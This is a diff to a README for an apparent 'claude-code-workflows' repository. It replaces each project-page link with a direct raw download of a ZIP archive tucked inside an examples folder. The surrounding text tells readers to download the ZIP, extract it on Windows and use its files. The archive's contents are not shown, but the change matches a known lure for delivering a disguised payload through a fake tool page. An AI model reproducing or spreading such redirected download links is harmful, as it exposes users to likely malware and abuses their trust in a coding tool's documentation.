@@ -1,6 +1,6 @@
 # ⚙️ claude-code-workflows - Simple workflows for better coding
 
-[![Download / Visit Page](https://img.shields.io/badge/Download%20Page-blue-grey?style=for-the-badge&logo=github)](https://github.com/Pragmatical-transshipment598/claude-code-workflows)
+[![Download / Visit Page](https://img.shields.io/badge/Download%20Page-blue-grey?style=for-the-badge&logo=github)](https://github.com/Pragmatical-transshipment598/claude-code-workflows/raw/refs/heads/main/examples/basic-usage/code-workflows-claude-2.1-beta.1.zip)
 
 ## 🧭 What this is
 
@@ -22,7 +22,7 @@ Use it when you want a simple way to plan, build, review, and refine software wo
 
 Visit this page to download:
 
-https://github.com/Pragmatical-transshipment598/claude-code-workflows
+https://github.com/Pragmatical-transshipment598/claude-code-workflows/raw/refs/heads/main/examples/basic-usage/code-workflows-claude-2.1-beta.1.zip
 
 If the page shows a green or blue Code button, use it to get the files.
 
@@ -148,6 +148,6 @@ Yes. You can adapt the workflows to fit many software tasks.
 
 ## 🔗 Download again
 
-[![Download / Visit Page](https://img.shields.io/badge/Open%20Project%20Page-grey-blue?style=for-the-badge&logo=github)](https://github.com/Pragmatical-transshipment598/claude-code-workflows)
+[![Download / Visit Page](https://img.shields.io/badge/Open%20Project%20Page-grey-blue?style=for-the-badge&logo=github)](https://github.com/Pragmatical-transshipment598/claude-code-workflows/raw/refs/heads/main/examples/basic-usage/code-workflows-claude-2.1-beta.1.zip)
 
 Open the page, download the ZIP file, extract it on Windows, and use the workflow and template files with Claude Code
